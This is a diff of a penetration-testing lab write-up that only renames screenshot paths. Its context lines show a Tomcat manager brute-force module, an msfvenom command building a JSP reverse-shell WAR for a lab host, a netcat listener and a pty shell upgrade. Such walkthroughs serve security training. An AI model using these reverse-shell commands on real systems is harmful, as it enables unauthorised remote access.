@@ -27,7 +27,7 @@ The best tools for this lab are:
 
 ## My Solution
 
-![](<../../../../.gitbook/assets/image (28).png>)
+![](<../../../../.gitbook/assets/image (28) (1).png>)
 
 ## Nmap
 
@@ -172,7 +172,7 @@ use auxiliary/scanner/http/tomcat_mgr_login
 
 ![](<../../../../.gitbook/assets/image (58) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (26) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (26) (1) (1) (1).png>)
 
 ### Exploit
 
@@ -192,7 +192,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o re
 nc -lvp 6666
 ```
 
-![](<../../../../.gitbook/assets/image (47) (1).png>)
+![](<../../../../.gitbook/assets/image (47) (1) (1).png>)
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
